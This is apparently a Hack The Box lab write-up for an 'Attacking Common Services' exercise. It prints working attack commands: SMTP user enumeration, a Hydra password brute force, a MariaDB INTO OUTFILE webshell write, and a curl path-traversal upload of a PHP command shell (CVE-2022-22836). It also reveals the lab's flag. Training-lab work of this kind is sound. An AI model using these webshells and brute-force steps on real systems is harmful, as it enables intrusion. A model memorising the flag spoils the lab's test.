# Attacking Common Services - Easy

**Target:** 10.129.84.111 (inlanefreight.htb)
**Objective:** Assess target and obtain the contents of `flag.txt`.

---

## Service Enumeration

**Nmap Findings**

- FTP (CoreFTP)
- HTTP / HTTPS (Apache 2.4.53, PHP 7.4.29)
- SMTP (hMailServer)
- MySQL (MariaDB 10.4.x)
- RDP

**SMTP Enumeration**

```bash
smtp-user-enum.pl -M RCPT -U users.list -D inlanefreight.htb -t 10.129.84.111
```

- Valid user discovered: `fiona@inlanefreight.htb`

**Password Discovery**

```bash
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -I -t 64 10.129.84.111 smtp
```

- Password for `fiona`: `987654321`

------

## Initial Access

- FTP login as `fiona:987654321`.
- FTP allowed file uploads.
- Web vhost `inlanefreight.htb` mapped to `C:\xampp\htdocs\`.

------

## Privilege Escalation / Execution

**Method 1: MariaDB File Write**

```sql
SELECT "<?php echo shell_exec('powershell -e');?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

- Created a PHP webshell in the Apache webroot.
- Invoked PowerShell reverse shell payload → interactive session as **Administrator**.

**Method 2 (Alternate): FTP Upload Abuse (CVE-2022-22836)**

```bash
curl -k -X PUT -H "Host: inlanefreight.htb" --basic -u fiona:987654321 \
  --data-binary '<?php system($_GET["cmd"]); ?>' \
  --path-as-is https://10.129.178.249/../../../../xampp/htdocs/shell.php
```

------

## Post-Exploitation

**Artifacts**

- Webshell: `C:/xampp/htdocs/shell.php`
- Retrieved flag:

```
C:\Users\Administrator\Desktop\flag.txt
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

**Tools Utilized**

- Hydra
- smtp-user-enum
- curl
- MariaDB SELECT ... INTO OUTFILE

------

## Key Takeaways

- Weak credentials (`987654321`) combined with service exposure enabled compromise.
- Misconfigured MariaDB (file writes) was a direct path to code execution.
- Disabling FTP uploads and DB file writes would close primary attack vectors.